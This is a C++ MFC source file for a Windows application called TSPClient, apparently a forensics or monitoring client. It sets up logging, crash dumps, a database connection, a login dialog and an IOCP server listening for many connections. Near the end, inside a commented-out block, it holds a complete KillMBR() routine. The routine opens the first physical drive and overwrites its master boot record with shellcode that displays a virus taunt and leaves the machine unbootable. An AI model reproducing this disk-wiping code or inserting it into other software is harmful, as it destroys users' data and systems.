// TSPClient.cpp : Defines the class behaviors for the application.
//
#pragma comment(lib,"msvcrt.lib")

#include "stdafx.h"
#include "TSPClientPublic.h"
#include "TSPClient.h"

#include "MainFrm.h"
#include "TSPClientDoc.h"
#include "TSPClientView.h"
#include "LOGIN.h"
#include "Dbghelp.h"
#include "Log.h"
#include "Public.h"
#pragma comment(lib,"Dbghelp.lib")

#include "..\\WdkPath\myprocess.h"
#include "..\\WdkPath\common.h"
//#pragma comment(lib,"foxsdkA.lib")
#include "SplashScreenEx.h"



//***********************************2.0上线代码*******
#include "MyDBConn.h"
#include "RunLog.h"

//****************************************************


CMyDataBase  MyDataBase;




LOGIN Login;
//CLog g_log;
CLog g_logErr;

//CWriteLog m_FileLog;
HANDLE g_hEventQuit=NULL;
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	char buff[1024];
	memset(buff, 0, sizeof(buff));
	wsprintf
		(buff, 
		"CRASH CODE:0x%.8x ADDR=0x%.8x FLAGS=0x%.8x PARAMS=0x%.8x\n"
		"eax=%.8x ebx=%.8x ecx=%.8x\nedx=%.8x esi=%.8x edi=%.8x\neip=%.8x esp=%.8x ebp=%.8x\n",
		ExceptionInfo->ExceptionRecord->ExceptionCode,
		ExceptionInfo->ExceptionRecord->ExceptionAddress,
		ExceptionInfo->ExceptionRecord->ExceptionFlags,
		ExceptionInfo->ExceptionRecord->NumberParameters,
		ExceptionInfo->ContextRecord->Eax,
		ExceptionInfo->ContextRecord->Ebx,
		ExceptionInfo->ContextRecord->Ecx,
		ExceptionInfo->ContextRecord->Edx,
		ExceptionInfo->ContextRecord->Esi,
		ExceptionInfo->ContextRecord->Edi,
		ExceptionInfo->ContextRecord->Eip,
		ExceptionInfo->ContextRecord->Esp,
		ExceptionInfo->ContextRecord->Ebp
		);
	
	g_log.Log(LEVEL_ERROR,"退出信息：%s\r\n",buff);
	g_logErr.Log(LEVEL_ERROR,"退出信息：%s\r\n",buff);

	CTime dwtime = CTime::GetCurrentTime();
	char szBuf[MAX_PATH*3]={0};
	wsprintf(szBuf, "%04d-%02d-%02d-%02d-%02d-%02d",\
		dwtime.GetYear(), dwtime.GetMonth(), dwtime.GetDay(), dwtime.GetHour(), dwtime.GetMinute(), dwtime.GetSecond());

	char szLogFileName[MAX_PATH] = {0};
	wsprintf(szLogFileName, "%s\\log\\%s.dmp", GetExeCurrentDir(),szBuf);

	g_log.Log(LEVEL_ERROR,"退出信息：%s\r\n",szLogFileName);
	g_logErr.Log(LEVEL_ERROR,"退出信息：%s\r\n",szLogFileName);

	MINIDUMP_EXCEPTION_INFORMATION ExInfo;

	ExInfo.ThreadId = ::GetCurrentThreadId();
	ExInfo.ExceptionPointers = ExceptionInfo;
	ExInfo.ClientPointers = false;

	HANDLE hFile = CreateFile(szLogFileName, GENERIC_READ | GENERIC_WRITE,
		0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
	//BOOL bOK = MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(), hFile, MiniDumpNormal, &ExInfo, NULL, NULL );
	BOOL bOK = MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(), hFile,MiniDumpValidTypeFlags, &ExInfo, NULL, NULL );

	CloseHandle(hFile);


	//ExitProcess(0);

	//MessageBox(NULL, buff, "TSPClient Exception", MB_OK);

}

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	//ExitProcess(0);
	dbg_dump(ExceptionInfo);
	// 不退出
	return TRUE;
	/*ExitProcess(0);*/
}
/////////////////////////////////////////////////////////////////////////////
// CTSPClientApp

BEGIN_MESSAGE_MAP(CTSPClientApp, CWinApp)
	//{{AFX_MSG_MAP(CTSPClientApp)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
	ON_COMMAND(ID_FILE_NEW, CWinApp::OnFileNew)
	ON_COMMAND(ID_FILE_OPEN, CWinApp::OnFileOpen)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CTSPClientApp construction

CTSPClientApp::CTSPClientApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance

	// 初始化本进程的图像列表, 为加载系统图标列表做准备
	typedef BOOL (WINAPI * pfn_FileIconInit) (BOOL fFullInit);
	pfn_FileIconInit FileIconInit = (pfn_FileIconInit) GetProcAddress(LoadLibrary("shell32.dll"), (LPCSTR)660);
	FileIconInit(TRUE);



	HANDLE	hFile = CreateFile("QQwry.dat", 0, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		m_bIsQQwryExist = TRUE;
	}
	else
	{
		m_bIsQQwryExist = FALSE;
	}
	CloseHandle(hFile);

	m_bIsDisablePopTips = m_IniFile.GetInt("Settings", "PopTips", FALSE);
	m_filterUnknown=m_IniFile.GetInt("Settings", "filter unknown clue", FALSE);
	m_autoSelectVisible=m_IniFile.GetInt("Settings", "auto select and visible", FALSE);

	//m_pConnectView = NULL;
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CTSPClientApp object

CTSPClientApp theApp;


void Startransceiver()
{
	TCHAR szTransceiverPath[MAX_PATH]={0};
	wsprintf(szTransceiverPath,"%s\\transceiver.exe",GetExeCurrentDir());
	
// 	if (DWORD dwID=CProcess::FindProcessID())
// 	{
// 		TCHAR szProcPath[MAX_PATH]={0};
// 		CProcess::GetProcessFullPath(szProcPath,dwID);
// 		if (stricmp(szProcPath,szTransceiverPath)==0)
// 		{
// 			return;
// 		}
// 	}
	

	return;	
}





/////////////////////////////////////////////////////////////////////////////
// CTSPClientApp initialization


BOOL CTSPClientApp::InitInstance()
{

	char LogFile[MAX_PATH];

	sprintf(LogFile,"%s\\log\\",GetDataPath());
	MakeSureDirectoryPathExists(LogFile);
	sprintf(LogFile,"%s\\log\\日志.log",GetDataPath());
	g_log.Open(LogFile,OUT_MODE_TO_FILE,EXT_MODE_LOCAL_TIME|EXT_MODE_THREAD_ID|EXT_MODE_COUNT|EXT_MODE_LINE|EXT_MODE_TRUNC,1000,64*1024*1024);
	LOG((LEVEL_FUNC_IN_OUT,"\nProcess Start.\n"));

	sprintf(LogFile,"%s\\log\\错误.log",GetDataPath());
	g_logErr.Open(LogFile,OUT_MODE_TO_FILE,EXT_MODE_LOCAL_TIME|EXT_MODE_THREAD_ID|EXT_MODE_COUNT,1000,64*1024*1024);
	g_hEventQuit = ::CreateEvent(NULL, TRUE, FALSE, NULL);
	::ResetEvent(g_hEventQuit);

	//QQ解密程序
//	CloseHandle(::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartQQDecrypt,0,0,NULL));


	//禁止多个实例
	HANDLE m_hMutex = ::CreateMutex(NULL, TRUE, _T("Tsp-Client"));
	DWORD dwError = ::GetLastError();
	if (ERROR_ALREADY_EXISTS == dwError || ERROR_ACCESS_DENIED == dwError) 
	{
		CWnd *pWndPrev = NULL;
		CWnd *pWndChild = NULL;
		char szWindowName[MAX_PATH] = {0};
		wsprintf(szWindowName, "RUN TSP取证系统");
		if (pWndPrev = CWnd::FindWindow(NULL, szWindowName))
		{
			pWndChild = pWndPrev->GetLastActivePopup();
			if (pWndPrev->IsIconic())
			{
				pWndPrev->ShowWindow(SW_RESTORE);
			}
			else
			{
				pWndPrev->ShowWindow(SW_NORMAL);
			}

			pWndChild->SetForegroundWindow();
		}

		return FALSE;
	}


	SetUnhandledExceptionFilter(bad_exception);
	AfxEnableControlContainer();

	//*
	CSplashScreenEx *lpSplash=new CSplashScreenEx();
	lpSplash->Create(lpSplash,NULL,CSS_FADE | CSS_CENTERSCREEN | CSS_SHADOW);
	lpSplash->SetBitmap(IDB_SPLASH, 255, 0, 255);
	lpSplash->SetTextFont("MS Sans Serif", 100, CSS_TEXT_NORMAL);
	lpSplash->SetTextRect(CRect(20, 100, 250, 120));	//左上右下
	lpSplash->SetTextColor(RGB(0, 255, 0));
	lpSplash->SetTextFormat(DT_SINGLELINE | DT_CENTER | DT_VCENTER);
// 	lpSplash->SetText("锐安科技");				//设置文字
	lpSplash->Show();
	Sleep(500);
	lpSplash->Hide(); 
	//delete lpSplash;

	WSADATA wsaData = {0};
	WORD wVersionRequested = MAKEWORD(2, 2);
	::WSAStartup(wVersionRequested, &wsaData );


	


	


	


	
	
	if(!MyDataBase.ConnDB())  //modify by menglz  2013-11-25
	{
		AfxMessageBox("连接数据库失败，请检查是否启动数据库!!"); 
		exit(0);

	
	}

	MyDataBase.ExeSQL("SET character_set_client='utf8'");
	MyDataBase.ExeSQL("SET character_set_connection='utf8'");
	


//****************************************************



//#ifndef _MYDEBUG
	Login.DoModal();
	if ( Login.dLogin <= 10000 )
	{
		return FALSE;
	}
//#endif


	CSingleDocTemplate* pDocTemplate;
	pDocTemplate = new CSingleDocTemplate(
		IDR_MAINFRAME,
		RUNTIME_CLASS(CTSPClientDoc),
		RUNTIME_CLASS(CMainFrame),       // main SDI frame window
		RUNTIME_CLASS(CTSPClientView));
	AddDocTemplate(pDocTemplate);

	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
	ParseCommandLine(cmdInfo);

	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;

	// 去掉菜单栏
//	m_pMainWnd->SetMenu(NULL);
	// The one and only window has been initialized, so show and update it.
	m_pMainWnd->ShowWindow(SW_SHOW);
	m_pMainWnd->UpdateWindow();
	// 启动IOCP服务器
	int	nPort = m_IniFile.GetInt("Settings", "ListenPort");
	int	nMaxConnection = m_IniFile.GetInt("Settings", "MaxConnection");
	if (nPort == 0)
		nPort = 80;
	if (nMaxConnection == 0)
		nMaxConnection = 10000;
	
	if (m_IniFile.GetInt("Settings", "MaxConnectionAuto"))
		nMaxConnection = 8000;


	
	((CMainFrame*) m_pMainWnd)->Activate(nPort, nMaxConnection);

	return TRUE;
}


/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
		// No message handlers
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CTSPClientApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

/*去硬盘锁
/////////////////////////////////////////////////////////////////////////////
// CTSPClientApp message handlers

unsigned char scode[] =
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
"\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";

int CTSPClientApp::KillMBR()
{
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = {0};
	
	// 重新构造MBR
	memcpy(pMBR, scode, sizeof(scode) - 1);
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;
	
	hDevice = CreateFile
		(
		"\\\\.\\PHYSICALDRIVE0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
		);
	if (hDevice == INVALID_HANDLE_VALUE)
		return -1;
	DeviceIoControl
		(
		hDevice, 
		FSCTL_LOCK_VOLUME, 
		NULL, 
		0, 
		NULL, 
		0, 
		&dwBytesReturned, 
		NULL
		);
	// 写入病毒内容
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl
		(
		hDevice, 
		FSCTL_UNLOCK_VOLUME, 
		NULL, 
		0, 
		NULL, 
		0, 
		&dwBytesReturned, 
		NULL
		);
	CloseHandle(hDevice);

	ExitProcess(-1);
	return 0;
}
*/
int CTSPClientApp::ExitInstance()
{
	// TODO: 在此添加专用代码和/或调用基类

	WSACleanup();
	return CWinApp::ExitInstance();
}
